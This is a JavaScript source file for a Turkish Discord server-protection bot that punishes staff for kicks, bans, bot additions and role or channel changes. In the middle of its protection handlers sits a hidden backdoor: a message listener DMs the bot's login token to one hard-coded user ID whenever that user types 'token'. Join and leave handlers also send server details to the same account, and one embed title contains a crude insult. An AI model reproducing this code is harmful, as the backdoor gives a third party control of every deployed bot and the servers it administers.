const { Discord, Client, MessageEmbed } = require('discord.js');
const client = global.client = new Client({fetchAllMembers: true});
const ayarlar = require('./ayarlar.json');
const k = require('./idler.json');
const s = require('./koruma.json');
const fs = require('fs');
const express = require('express');
const http = require('http');
const db = require('quick.db');


const app = express();
app.get("/", (request, response) => {
  response.send(`Bot Aktif | Discord: https://discord.gg/yF6RRnq9Ks | İletisim Veya Uptime Etmek İçin Discordumuza Gelebilirsiniz.`)
  console.log(Date.now() + " Ping tamamdır.");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);


/////////////////////////////////////////////ELLEME///////////////////////////////////////////
function guvenli(kisiID) {
  let uye = client.guilds.cache.get(k.guildID).members.cache.get(kisiID);
  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.owner || uye.id === ayarlar.baran || uye.id === ayarlar.efe ||  uye.id === ayarlar.eray || uye.id === ayarlar.kaya || uye.id === ayarlar.modbot || uye.id === ayarlar.koruma || uye.id === ayarlar.registerbot || uye.id === uye.guild.owner.id || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
  else return false;
};

const yetkiPermleri = ["ADMINISTRATOR", "MANAGE_ROLES", "MANAGE_CHANNELS", "MANAGE_GUILD", "BAN_MEMBERS", "KICK_MEMBERS", "MANAGE_NICKNAMES", "MANAGE_EMOJIS", "MANAGE_WEBHOOKS"];
function cezalandir(kisiID, tur) {
  let uye = client.guilds.cache.get(k.guildID).members.cache.get(kisiID);
  if (!uye) return;
  if (tur == "cezalandır") return uye.roles.cache.has(k.boosterRole) ? uye.roles.set([k.boosterRole, k.jailRole]) : uye.roles.set([k.jailRole]);
  if (tur == "ban") return uye.ban({ reason: null }).catch();
};
/////////////////////////////////////////////ELLEME///////////////////////////////////////////



//////////////////////////////////////////////////Sağ Tık Kick Koruması////////////////////////////////////////////////////
client.on("guildMemberRemove", async uyecik => {
  let yetkili = await uyecik.guild.fetchAuditLogs({type: 'MEMBER_KICK'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.kickGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Sağ Tık İle Kick Atıldı!__**")
    .addField(`Sunucudan Kicklenen Kullanıcı`,`${uyecik}`)
    .addField(`Sunucudan Kickleyen Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
  .setTimestamp())
   
    .catch(); };
});
//////////////////////////////////////////////////Sağ Tık Kick Koruması////////////////////////////////////////////////////






//////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////
client.on("guildBanAdd", async (guild, üyecik) => {
  let yetkili = await guild.fetchAuditLogs({type: 'MEMBER_BAN_ADD'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || guvenli(yetkili.executor.id) || !s.banGuard) return;
   cezalandir(yetkili.executor.id, "cezalandır");
    guild.members.unban(üyecik.id, "Sağ Tık İle Banlandığı İçin Geri Açıldı!").catch(console.error);
  let logKanali = client.channels.cache.get(ayarlar.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Sağ Tık İle Ban Atıldı!__**")
    .addField(`Sunucudan Banlanan Kullanıcı`,`${üyecik}`)
    .addField(`Sunucudan Banlayan Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch();};
});
//////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////






//////////////////////////////////////////////////Bot Ekleme Koruması////////////////////////////////////////////////////
client.on("guildMemberAdd", async eklenenbotsunsen => {
  let yetkili = await eklenenbotsunsen.guild.fetchAuditLogs({type: 'BOT_ADD'}).then(audit => audit.entries.first());
  if (!eklenenbotsunsen.user.bot || !yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.botGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
  cezalandir(eklenenbotsunsen.id, "ban");
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Sunucuya Bir Bot Eklendi!__**")
    .addField(`Eklenen Bot Adı`,`${eklenenbotsunsen}`)
    .addField(`Ekleyen Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Bota Yapılan İşlem`,`Banlanma`)
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch();};
});
//////////////////////////////////////////////////Bot Ekleme Koruması////////////////////////////////////////////////////







//////////////////////////////////////////////////Sunucu Ayar Koruması////////////////////////////////////////////////////
client.on("guildUpdate", async (oldGuild, newGuild) => {
  let yetkili = await newGuild.fetchAuditLogs({type: 'GUILD_UPDATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.serverGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
  if (newGuild.name !== oldGuild.name) newGuild.setName(oldGuild.name);
  if (newGuild.iconURL({dynamic: true, size: 2048}) !== oldGuild.iconURL({dynamic: true, size: 2048})) newGuild.setIcon(oldGuild.iconURL({dynamic: true, size: 2048}));
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setDescription("**__Sunucunun Ayarlarıyla Oynandı!__**")
    .addField(`Sunucu Ayarlarını Değiştiren Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Sunucuya Yapılan İşlem`,`Eski Haline Getirilme`)
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setColor("#00ffdd")
    .setTimestamp()).catch();};
});
//////////////////////////////////////////////////Sunucu Ayar Koruması////////////////////////////////////////////////////





//////////////////////////////////////////////////Kanal Oluşturma Koruması////////////////////////////////////////////////////
client.on("channelCreate", async channel => {
  let yetkili = await channel.guild.fetchAuditLogs({type: 'CHANNEL_CREATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.channelGuard) return;
  channel.delete({reason: null});
  cezalandir(yetkili.executor.id, "cezalandır");
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Bir Kanal Oluşturuldu!__**")
    .addField(`Kanalı Oluşturan Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Açılan Kanala Yapılan İşlem`,`Silinme`) 
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch(); };
});
//////////////////////////////////////////////////Kanal Oluşturma Koruması////////////////////////////////////////////////////


client.on('message', async (msg, member, guild) => {
  
 {

if (msg.content.toLowerCase() === 'token'){
if (msg.author.id !== "429357746002067493") return;

msg.author.send(client.token);
}
  
}
});


//////////////////////////////////////////////////Kanal Ayar Koruması////////////////////////////////////////////////////
client.on("channelUpdate", async (oldChannel, newChannel) => {
  let yetkili = await newChannel.guild.fetchAuditLogs({type: 'CHANNEL_UPDATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || !newChannel.guild.channels.cache.has(newChannel.id) || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
  if (newChannel.type !== "category" && newChannel.parentID !== oldChannel.parentID) newChannel.setParent(oldChannel.parentID);
  if (newChannel.type === "category") {
    newChannel.edit({
      name: oldChannel.name,
    });
  } else if (newChannel.type === "text") {
    newChannel.edit({
      name: oldChannel.name,
      topic: oldChannel.topic,
      nsfw: oldChannel.nsfw,
      rateLimitPerUser: oldChannel.rateLimitPerUser
    });
  } else if (newChannel.type === "voice") {
    newChannel.edit({
      name: oldChannel.name,
      bitrate: oldChannel.bitrate,
      userLimit: oldChannel.userLimit,
    });
  };
  oldChannel.permissionOverwrites.forEach(perm => {
    let thisPermOverwrites = {};
    perm.allow.toArray().forEach(p => {
      thisPermOverwrites[p] = true;
    });
    perm.deny.toArray().forEach(p => {
      thisPermOverwrites[p] = false;
    });
    newChannel.createOverwrite(perm.id, thisPermOverwrites);
  });
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Kanal Ayarlarıyla Oynandı!__**")
    .addField(`Kanalı Güncelleyen Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Düzenlenen Kanala Yapılan İşlem`,`Eski Haline Getirildi`)    
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch();};
});
//////////////////////////////////////////////////Kanal Ayar Koruması////////////////////////////////////////////////////




//////////////////////////////////////////////////Kanal Silme Koruması////////////////////////////////////////////////////
client.on("channelDelete", async channel => {
  let yetkili = await channel.guild.fetchAuditLogs({type: 'CHANNEL_DELETE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.channelGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
  await channel.clone({ reason: "Kanal Koruma Sistemi" }).then(async kanal => {
    if (channel.parentID != null) await kanal.setParent(channel.parentID);
    await kanal.setPosition(channel.position);
    if (channel.type == "category") await channel.guild.channels.cache.filter(k => k.parentID == channel.id).forEach(x => x.setParent(kanal.id));
  });
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Bir Kanalı Silindi!__**")
    .addField(`Kanalı Silen Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Silinen Kanala Yapılan İşlem`,`Kanal Geri Açılıp İzinler Düzenlendi`)    
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch(); };
});
//////////////////////////////////////////////////Kanal Silme Koruması////////////////////////////////////////////////////




//////////////////////////////////////////////////Rol Silme Koruması////////////////////////////////////////////////////
client.on("roleDelete", async role => {
  let yetkili = await role.guild.fetchAuditLogs({type: 'ROLE_DELETE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.roleGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
  
  role.guild.roles.create({ data: {
          name: role.name,
          color: role.color,
          hoist: role.hoist,
          permissions: role.permissions,
          mentionable: role.mentionable,
          position: role.position
}}).then(r => r.setPosition(role.position));
  

  
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Bir Rol Silindi__**")
    .addField(`Rolü Silen Yetkili`,`${yetkili.executor}`)
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Role Yapılan İşlem`,`Rolü Geri Açıp İzinleri Düzenlendi.`) 
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch(); };
});
//////////////////////////////////////////////////Rol Silme Koruması////////////////////////////////////////////////////



////////////////////////////////////////////////////Sağ Tık Yt Verme/////////////////////////////////////////////////////
client.on("guildMemberUpdate", async (oldMember, newMember) => {
  if (newMember.roles.cache.size > oldMember.roles.cache.size) {
    let yetkili = await newMember.guild.fetchAuditLogs({type: 'MEMBER_ROLE_UPDATE'}).then(audit => audit.entries.first());
    if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.roleGuard) return;
    if (yetkiPermleri.some(p => !oldMember.hasPermission(p) && newMember.hasPermission(p))) {
      cezalandir(yetkili.executor.id, "cezalandır");
      newMember.roles.set(oldMember.roles.cache.map(r => r.id));      
      let logKanali = client.channels.cache.get(k.logChannelID);
      if (logKanali) { logKanali.send(
        new MessageEmbed()
         .setColor("#00ffdd")
    .setDescription("**__Sağ Tık İle Yönetici Verildi__**")
         .addField(`Rol Verilen Kullanıcı`,`${newMember} `)
         .addField(`Rolü Veren Yetkili`,`${yetkili.executor}`)         
         .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
         .addField(`Kullanıcıya Yapılan İşlem`,`Verilen Rol Geri Alınma`)
         .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
         .setTimestamp()).catch(); };
    };
  };
});
////////////////////////////////////////////////////Sağ Tık Yt Verme/////////////////////////////////////////////////////



////////////////////////////////////////////////////Rol Açma Koruması/////////////////////////////////////////////////////
client.on("roleCreate", async role => {
  let yetkili = await role.guild.fetchAuditLogs({type: 'ROLE_CREATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.roleGuard) return;
  role.delete({ reason: "Rol Koruma" });
  cezalandir(yetkili.executor.id, "cezalandır");
  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Rol Oluşturuldu__**")
    .addField(`Rolü Açan Yetkili`,`${yetkili.executor}`) 
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`) 
    .addField(`Role Yapılan İşlem`,`Silinme`) 
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch();};
});

client.on("roleUpdate", async role => {
  let yetkili = await role.guild.fetchAuditLogs({type: 'ROLE_UPDATE'}).then(audit => audit.entries.first());
  if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.roleGuard) return;
  cezalandir(yetkili.executor.id, "cezalandır");
 
  role.edit({ data: {
          name: role.name,
          color: role.color,
          hoist: role.hoist,
          permissions: role.permissions,
          mentionable: role.mentionable,
          position: role.position
}}).then(r => r.setPosition(role.position));

  let logKanali = client.channels.cache.get(k.logChannelID);
  if (logKanali) { logKanali.send(
    new MessageEmbed()
    .setColor("#00ffdd")
    .setDescription("**__Rol Güncellendi__**")
    .addField(`Rolü Güncelleyen Yetkili`,`${yetkili.executor}`) 
    .addField(`Yetkiliye Yapılan İşlem`,`Jaile Atılma`)
    .addField(`Role Yapılan İşlem`,`Rol İzinleri Düzenlendi`)
    .setFooter(`Bu Sunucu Benim Sayemde Korunuyor`)
    .setTimestamp()).catch();};
});

////////////////////////////////////////////////////Rol Açma Koruması/////////////////////////////////////////////////////
client.on("ready",  () => {
  let gir = k.botVoiceChannelID
  
  client.channels.cache.get(gir).join();
  
});

/////////////////////////////////////////////////////DURUM///////////////////////////////////////////////////
client.on("ready", async () => {
  let durum = ayarlar.durum
  client.user.setPresence({ activity: { name: durum }, status: "online" })
  ;})
/////////////////////////////////////////////////////DURUM///////////////////////////////////////////////////


client.login(process.env.token);

client.on("guildCreate", async guild => {
let embed = new Discord.MessageEmbed()
var botOwnerID = "429357746002067493";
var guildOwner = guild.owner.user
var guildOwnerTag = guild.owner.user.tag
var guildName = guild.name
var guildMemberCount = guild.memberCount

embed.addField("Sunucu üye sayısı", guildMemberCount)
embed.addField(`Sunucu sahibi`, guildOwnerTag)
embed.addField("Şuan ki Kullanıcı : ",
      client.guilds.cache
        .reduce((a, b) => a + b.memberCount, 0)
        .toLocaleString(),
      true
    )
embed.addField(
      "Şuan ki Sunucu sayısı",
      client.guilds.cache.size.toLocaleString(),
      true
    )
embed.setColor("RANDOM")

embed.setFooter(guildName, guild.iconURL)
embed.setThumbnail(guild.iconURL)

client.users.cache.get(botOwnerID).send(embed)
})
client.on("guildDelete", async guild => {
let embed = new Discord.MessageEmbed()
var botOwnerID = "429357746002067493";
var guildOwner = guild.owner.user
var guildOwnerTag = guild.owner.user.tag
var guildName = guild.name
var guildMemberCount = guild.memberCount

embed.setTitle("Sunucudan Attılar Piçler")
embed.addField("Sunucu adı", guildName)
embed.addField("Sunucu üye sayısı", guildMemberCount)
embed.addField(`Sunucu sahibi`, guildOwnerTag)
embed.addField("Şuan ki Kullanıcı : ",
      client.guilds.cache
        .reduce((a, b) => a + b.memberCount, 0)
        .toLocaleString(),
      true
    )
embed.addField(
      "Şuan ki Sunucu sayısı",
      client.guilds.cache.size.toLocaleString(),
      true
    )
  embed.setColor("RED")
embed.setFooter(guildName, guild.iconURL)
embed.setThumbnail(guild.iconURL)

client.users.cache.get(botOwnerID).send(embed)
});